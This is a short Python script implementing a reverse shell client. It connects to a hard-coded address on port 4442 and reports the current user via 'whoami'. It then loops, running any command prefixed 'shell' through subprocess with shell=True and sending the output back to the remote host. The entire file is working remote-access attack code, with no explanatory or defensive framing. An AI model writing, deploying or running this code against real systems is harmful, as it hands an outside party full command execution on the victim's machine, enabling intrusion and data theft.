
import os, subprocess, socket
import ssl


def connect():
    try:
        global host
        global port
        global s
        global sock

        host = "172.16.69.132"
        port = 4442
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # s = ssl.wrap_socket(sock, ssl_version=ssl.PROTOCOL_TLSv1)
        print("Trying to Connect")
        s.connect((host, port))
        print("Connection Established")
        s.send(os.popen("whoami").read())
    except socket.error as msg:
        print("socket error : " + str(msg[0]))


def receive():
    receive2 = s.recv(1024)
    if receive2 == 'quit' or receive2 == 'exit':
        s.close()
    elif receive2[0:5] == 'shell':
        proc2 = subprocess.Popen(receive2[6:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = proc2.stdout.read() + proc2.stderr.read()
        args = output
    else:
        args = "Invalid Command"
    send(args)


def send(args):
    send = s.send(args)
    receive()


connect()
receive()
s.close()
